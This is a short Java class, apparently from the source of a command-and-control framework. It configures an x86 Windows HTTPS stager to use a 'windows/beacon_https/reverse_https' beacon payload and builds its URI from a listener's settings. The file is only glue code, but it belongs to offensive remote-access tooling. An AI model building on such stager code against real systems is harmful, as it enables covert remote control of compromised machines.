package stagers;

import common.Listener;

public class BeaconHTTPSStagerX86
        extends GenericHTTPSStagerX86 {
    public BeaconHTTPSStagerX86(Listener l) {
        super(l);
    }

    @Override
    public String payload() {
        return "windows/beacon_https/reverse_https";
    }

    @Override
    public String getURI() {
        return this.getConfig().getURI() + this.getConfig().getQueryString();
    }
}

